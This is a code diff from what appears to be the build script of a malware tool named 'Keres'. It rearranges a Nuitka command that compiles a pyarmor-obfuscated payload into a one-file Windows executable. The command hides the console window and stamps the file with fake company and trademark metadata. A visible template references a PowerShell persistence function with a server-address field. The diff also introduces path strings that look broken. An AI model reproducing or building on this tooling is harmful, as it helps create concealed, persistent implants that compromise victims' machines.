@@ -51,29 +51,8 @@ def create_linux(py_file):
         print(f"An error occurred: {e}")
 def create_exe(py_file):
     try:
-       
-        icons_directory = "icons"
-        icon_file = os.path.join(icons_directory, 'keres.ico')  # Default icon file path
-        is_windows = platform.system().lower() == "windows"
-        python_executable = "python" if is_windows else "python3"
-        if platform.system().lower() != "windows":
-            raise Exception("You need to compile in a Windows environment use -Pl to specify target Platforme .")
-        nuitka_command = [
-            python_executable, "-m", "nuitka",
-            "--onefile",
-            "--company-name=Keres",
-            "--file-version=1.2",
-            "--copyright=COPYRIGHT@Keres",
-            "--trademarks=No Enemies",
-            f"--windows-icon-from-ico=icons/keres.ico",
-            "--disable-console",
-            "--standalone",
-            "--remove-output",
-            f"--output-dir=Output",
-            f"--output-filename=Keres",
-            "--include-package=pyarmor_runtime_000000",
-            py_file
-        ]
+        
+
         try:
             subprocess.run(["pyarmor", "cfg", "restrict_module=0"])
         except subprocess.CalledProcessError as e:
@@ -86,6 +65,29 @@ def create_exe(py_file):
 
         try:
             py_file = './dist/pewpew.py' if os.path.exists('./dist/pewpew.py') else './pewpew.py'
+            icons_directory = "icons"
+            icon_file = os.path.join(icons_directory, 'keres.ico')  # Default icon file path
+            is_windows = platform.system().lower() == "windows"
+            python_executable = "python" if is_windows else "python3"
+            if platform.system().lower() != "windows":
+                raise Exception("You need to compile in a Windows environment use -Pl to specify target Platforme .")
+            nuitka_command = [
+                python_executable, "-m", "nuitka",
+                "--onefile",
+                "--company-name=Keres",
+                "--file-version=1.2",
+                "--copyright=COPYRIGHT@Keres",
+                "--trademarks=No Enemies",
+                f"--windows-icon-from-ico=icons/keres.ico",
+                "--disable-console",
+                "--standalone",
+                "--remove-output",
+                f"--output-dir=Output",
+                f"--output-filename=Keres",
+                "--include-package=pyarmor_runtime_000000",
+                py_file
+            ]
+           
             subprocess.run(nuitka_command)
         except subprocess.CalledProcessError as e:
             print(f"Error in subprocess: {e}")
@@ -210,7 +212,7 @@ Start-PersistentCommand -UniqueIdentifier "Keres" -ServerAddress "{server_addres
 
     if args.platform =='Linux':
         
-        create_linux("./dist/lkeres.py")
+        create_linux(".lkeres.py")
         print("Finished creating the executable in Output folder.")
         sys.exit()
 
@@ -221,7 +223,7 @@ Start-PersistentCommand -UniqueIdentifier "Keres" -ServerAddress "{server_addres
     print('\n')
     print("Creating the executable...")
     print('\n')
-    create_exe('./dist/pewpew.py')
+    create_exe('.dist/pewpew.py')
     print("Finished creating the executable in Output folder.")
     
 
